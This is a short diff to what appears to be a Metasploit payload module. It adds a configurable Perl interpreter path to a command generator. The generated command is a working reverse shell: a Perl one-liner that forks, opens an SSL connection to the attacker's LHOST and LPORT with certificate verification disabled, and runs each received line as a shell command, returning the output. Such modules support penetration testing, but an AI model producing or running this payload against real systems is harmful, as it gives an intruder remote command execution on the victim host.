@@ -29,6 +29,9 @@ module MetasploitModule
           'Payload' => ''
         }
       ))
+    register_options([
+      OptString.new('PERL_PATH', [true, 'The path to Perl interpreter', 'perl'])
+    ])
   end
 
   #
@@ -46,7 +49,7 @@ module MetasploitModule
     lhost = datastore['LHOST']
     ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-    cmd = "perl -e 'use IO::Socket::SSL;$p=fork;exit,if($p);"
+    cmd = "#{datastore['PERL_PATH']} -e 'use IO::Socket::SSL;$p=fork;exit,if($p);"
     cmd += "$c=IO::Socket::SSL->new(PeerAddr=>\"#{lhost}:#{datastore['LPORT']}\",SSL_verify_mode=>0);"
     cmd += "while(sysread($c,$i,8192)){syswrite($c,`$i`);}'"
   end
